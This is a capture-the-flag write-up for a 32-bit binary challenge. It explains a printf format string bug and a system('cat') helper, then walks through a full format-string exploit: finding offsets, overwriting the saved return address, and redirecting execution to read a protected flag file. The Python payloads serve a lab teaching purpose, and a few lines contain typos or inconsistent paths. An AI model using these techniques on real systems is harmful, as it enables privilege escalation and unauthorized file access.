# mission1 ~ string format bugs
## Goal and instructions
Connect to bin.chall.necst.it port 22 via SSH as user [USERNAME]. You will find the files in /home/[USERNAME]/mission1.

Your goal is to read the file flag with the privileges of the group that owns the vulnerable binary.

## compiled options
The executable program is compiled in 32bit, the stack is not executable and the canary is inactive.
```
gcc -m32 -no-pie -O0 -o mission1 mission1.c
```
## Code overview
The vulnerable print is in the function view_saved_art(), which will print strings previously saved in the create_art() function.
```
void view_saved_art(char* buffer)
{
    char padding[240];

    if(strlen(buffer) == 0)
    {
        printf("You have not saved any art yet!\n");
    }
    else
    {
        printf("Here is your saved art:\n");
        printf(buffer);
        putchar('\n');
    }
}
```
to be able to save a string this must include at least une *cat_features*, otherwise the execution will be killed.
```
// Cat Features
const char CAT_FEATURES[][8] = {"/\\_/\\", "( o.o )", "> ^ <"};
```
```
// Check if the ASCII Art corresponds to a cat (only cats are allowed)
if (strstr(buffer, CAT_FEATURES[0]) == NULL && strstr(buffer, CAT_FEATURES[1]) == NULL && strstr(buffer, CAT_FEATURES[2]) == NULL)
{
    printf("Sorry, only cat ASCII art is allowed!\n");
    memset(buffer, 0, MAX_ART_LENGTH);
    return;
}
```
inside the code is also provided a cat() function, this function will take as input a string, verify that the string only contains lower case characters, ad after call a system("cat" + input_string )
```
void cat(char* arg)
{
    char buffer[64];
    memset(buffer, 0, 64);

    // Protection against hackers who hate cats
    // Put a null byte at the first occurrence of ;
    // This will prevent the user from executing multiple commands
    for (int i = 0; i < strlen(arg); i++)
    {
        if (arg[i] == ';')
        {
            arg[i] = '\0';
            break;
        }
    }

    // Only allow lowercase letters in arg
    for (int i = 0; i < strlen(arg); i++)
    {
        if (arg[i] < 'a' || arg[i] > 'z')
        {
            printf("What are you thinking? Cats are a serious matter.\n");
            return;
        }
    }

    // Concate strings
    strcat(buffer, "cat ");
    strcat(buffer, arg);

    // Execute the cat (not in the way you think ;)
    system(buffer);
}
```
### command list
to choose which action triggered the program provide a numerical choice:
* **1 -** View example art
* **2 -** Save your own art
* **3 -** View your saved art
* **4 -** Exit
## Solution
[String format exploit](https://owasp.org/www-community/attacks/Format_string_attack) occurs when the submitted data of an input string is evaluated as a command by the application. an attacker can use specific string placeholders to overwrite some addresses in the program's virtual memory, causing new behaviors that could compromise the security or the stability of the system. <br>
useful placeholders are:
* **%N$x:** print characters saved on the stack, N is the offset from the stack base.
* **%Nc:** print exactly N characters.
* **%N$n** print in the address pointed by the argument the number of chars printed so far (N is the offset from the pointed address).

> **note:** % is \x25 in the ASCII table and $ is \x24

In order to correctly call the cat() function we need to sucessfully perform 2 String format exploit (in the same string):
1. overwrite the saved EIP value with the address of the cat function
2. save the string *flag;;;;* as the input of the cat function 
> **note:** the string itself will be saved in the buffer we want to write the pointer (reg number) to the input.

**Step 1 overwrite the saved EIP:**

* Estimate the offset from the buffer to the base of the stack, we will use a Python loop to increase the POS until %[POS]$x  prints the buffer content itself.
  ```
  for counter in {1..150}; do (python -c "print '2\n' + 'flag;;;;' + 'AAAA\x25' + str($counter) + '\x24x> ^ \x3c\n3\n4\n'"; cat - ) | env -i /home/[USERNAME]/mission1/mission1; done
  ```
  we are searching for "AAAA41414141" as output.<br><br>
* We add *flag;;;;* and print again the buffer content to verify the previous step. in our case POS=87
    > **note:** strlen("flag;;;;") = 2 word

  ```
  python -c "print '2\n' + 'flag;;;;' + 'AAAABBBB' + '\x25[POS+2]\x24hx'+ 'W +'\x25[POS+3]\x24hx'+ '> ^ <\n3\n4\n'" > ./writable/input.txt
  ```
  we are searching for "flag;;;;AAAABBBB41414242" as output.<br><br>
* We need the saved EIP address, we run the code with gdb and we need to set a breakpoint in the ret of view_saved_art (address 0x8048a08) to find it. <br>
In our case, the address is: \x5e\xdd\xff\xff
* Find the address of the cat() function  in the executable, with the following command:
  ```
  objdump -d mission1 Mintel
  ```
  in our case equal to: 0x08048a09 ► high_address: 2052 && low_address: 35337<br><br>
* Compute how many characters we need to print. <br>
  We need to overwrite the saved EIP with the low and high address of the cat function, %N$n prints the number of chars printed so far, we have already printed 28 chars, and we use %Nc to print the others. <br>
  we compute the numbers for %Nc as follows:<br>
  N = 2052 - 28 <br>
  M = TOT_ADDRESS -N <br><br>
  
  ```
  python -c "print '2\n' + 'flag;;;;' + '\x5e\xdd\xff\xff\x5c\xdd\xff\xff' + 'AAAABBBB' +  '\x25[N]c\x2589\x24hn\x25[M]c\x2590\x24hnAAA' + '> ^ <\n3\n4\n'" > ./writable/input.txt
  ```

* We can write the first string allowing us to jump in the cat function.
  ```
  python -c "print '2\n' + 'flag;;;;' + '\x5e\xdd\xff\xff\x5c\xdd\xff\xff' + 'AAAABBBB' +  '\x252028c\x2589\x24hn\x2533285c\x2590\x24hnAAA' + '> ^ <\n3\n4\n'" > ./writable/input.txt
  ```
  > **note:** 'AAAABBBB' is a placeholder for 2 addresses we will discover in future phases.

**Step 2 overwrite the function parameters:**
* similar to previous steps we add %[POS]$x to the string and verify the program prints ....41414242
  ```
  python -c "print '2\n' + 'flag;;;;' + '\x5e\xdd\xff\xff\x5c\xdd\xff\xff' + 'AAAABBBB' + '\x252028c\x2589\x24hn\x2533285c\x2590\x24hnAAA'+ '\x25[POS+4]\x24x\x25[POS+5]\x24x' + '> ^ <\n3\n4\n'"> ./writable/input.txt
  ```
* using gdb we search for the EAX address in the cat function, 0xffffdd64. <br>
 And for the buffer address (where the flag is saved), 0xffffdd8c ► high_address: 65335 && low_address: 56716
* Compute how many characters we need to print. <br>
  ```
    python -c "print '2\n' + 'flag;;;;' + '\x5e\xdd\xff\xff\x5c\xdd\xff\xff' + '\x64\xdd\xff\xff\x66\xdd\xff\xff' + '\x252028c\x2589\x24hn\x2533285c\x2590\x24hn'+ '\x25[M]c\x2591\x24hn\x25[N]c\x2592\x24hn' + '> ^ <\n3\n4\n'"> ./writable/input.txt
  ```
the final format string exploit becomes:
```
(python -c "print '2\n' + 'flag;;;;' + '\x5e\xdd\xff\xff\x5c\xdd\xff\xff' + '\x64\xdd\xff\xff\x66\xdd\xff\xff' + '\x252028c\x2589\x24hn\x2533285c\x2590\x24hn'+ '\x2521379c\x2591\x24hn\x258819c\x2592\x24hn' + '> ^ <\n3\n4\n'"; cat - ) | env -i PWD=/home/m259542/mission1 SHLVL=0 /home/m259098/mission2/mission2
```